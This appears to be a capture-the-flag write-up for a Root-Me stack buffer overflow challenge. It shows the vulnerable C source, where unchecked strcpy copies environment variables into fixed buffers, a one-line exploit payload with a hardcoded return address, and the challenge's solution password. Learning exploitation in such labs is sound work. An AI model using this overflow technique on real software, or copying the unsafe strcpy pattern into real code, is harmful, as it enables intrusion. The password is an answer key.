# ELF x86 - Stack buffer overflow basic 4
- Point: 30pts
- Author: [Lu33Y](https://www.root-me.org/Lu33Y?lang=en),  8 February 2012
- Level: Medium <br>
- Can you return the env to me pleazzz ? <br><br>
![image](https://user-images.githubusercontent.com/48288606/144751579-b6431726-2894-4a1e-946f-4bc797c9245c.png)

## Write-up:

```
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
 
struct EnvInfo
{
  char home[128];
  char username[128];
  char shell[128];  
  char path[128];  
};
 
 
struct EnvInfo GetEnv(void)
{
  struct EnvInfo env;
  char *ptr;
   
  if((ptr = getenv("HOME")) == NULL)
    {
      printf("[-] Can't find HOME.\n");
      exit(0);
    }
  strcpy(env.home, ptr);
  if((ptr = getenv("USERNAME")) == NULL)
    {
      printf("[-] Can't find USERNAME.\n");
      exit(0);
    }
  strcpy(env.username, ptr);
  if((ptr = getenv("SHELL")) == NULL)
    {
      printf("[-] Can't find SHELL.\n");
      exit(0);
    }
  strcpy(env.shell, ptr);
  if((ptr = getenv("PATH")) == NULL)
    {
      printf("[-] Can't find PATH.\n");
      exit(0);
    }
  strcpy(env.path, ptr);
  return env;
}
 
int main(void)
{
  struct EnvInfo env;
   
  printf("[+] Getting env...\n");
  env = GetEnv();
   
  printf("HOME     = %s\n", env.home);
  printf("USERNAME = %s\n", env.username);
  printf("SHELL    = %s\n", env.shell);
  printf("PATH     = %s\n", env.path);
   
  return 0;  
}
```

Payload: `(python -c "print('\x08'*4+'\xbc\xfa\xff\xbf')";cat) | ./ch16`

Password: Sm4shM3ify0uC4n


